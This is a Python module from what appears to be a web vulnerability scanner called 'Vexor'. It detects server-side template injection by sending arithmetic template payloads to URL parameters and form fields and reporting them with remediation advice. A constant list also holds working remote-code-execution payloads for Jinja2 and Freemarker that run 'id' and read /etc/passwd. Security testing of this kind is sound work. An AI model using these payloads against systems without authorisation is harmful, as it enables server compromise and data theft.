"""
Vexor SSTI Scanner — Server-Side Template Injection
Detects Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble
"""
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from vexor.modules.base import BaseScanner, Finding


# Math-based detection payloads — if result is evaluated, SSTI confirmed
SSTI_PAYLOADS = [
    # Jinja2/Twig
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    # Freemarker
    ("${7*7}", "49"),
    ("<#assign x=7*7>${x}", "49"),
    # Velocity
    ("#set($x=7*7)${x}", "49"),
    # Smarty
    ("{7*7}", "49"),
    # Pebble
    ("{{7*7}}", "49"),
    # Generic
    ("<%=7*7%>", "49"),
    ("${{7*7}}", "49"),
    ("{{config}}", "Config"),
    ("{{self}}", "self"),
]

# RCE payloads for confirmed SSTI
SSTI_RCE_PAYLOADS = [
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
]


class Scanner(BaseScanner):
    """SSTI Scanner"""

    MODULE_NAME = "ssti"
    MODULE_DESC = "Server-Side Template Injection Detection"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_forms(),
                return_exceptions=True
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = {"q": ["test"], "search": ["test"], "name": ["test"], "input": ["test"]}

        for param in list(params.keys())[:5]:
            await self._test_ssti(self.target, param)

    async def _scan_forms(self) -> None:
        resp = await self.get(self.target)
        if not resp:
            return
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'lxml')
            for form in soup.find_all('form')[:2]:
                action = form.get('action', self.target)
                if action.startswith('/'):
                    p = urlparse(self.target)
                    action = f"{p.scheme}://{p.netloc}{action}"
                for inp in form.find_all('input'):
                    name = inp.get('name', '')
                    if name and inp.get('type', 'text') not in ['hidden', 'submit', 'button']:
                        await self._test_ssti_post(action, name)
        except Exception:
            pass

    async def _test_ssti(self, url: str, param: str) -> None:
        for payload, expected in SSTI_PAYLOADS[:6]:
            test_url = self._inject_param(url, param, payload)
            resp = await self.get(test_url)
            if resp and expected in resp.text:
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln=f"SSTI — Server-Side Template Injection",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=f"Payload '{payload}' evaluated to '{expected}' in response",
                    description=f"SSTI in parameter '{param}' — RCE possible",
                    remediation=(
                        "Never pass user input directly to template engines. "
                        "Use sandboxed templates. Validate all inputs."
                    ),
                ))
                return

    async def _test_ssti_post(self, url: str, param: str) -> None:
        for payload, expected in SSTI_PAYLOADS[:4]:
            resp = await self.post(url, data={param: payload})
            if resp and expected in resp.text:
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln="SSTI — Server-Side Template Injection (POST)",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=f"POST payload '{payload}' evaluated to '{expected}'",
                    description=f"SSTI in POST parameter '{param}'",
                    remediation="Sanitize all template inputs",
                ))
                return

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
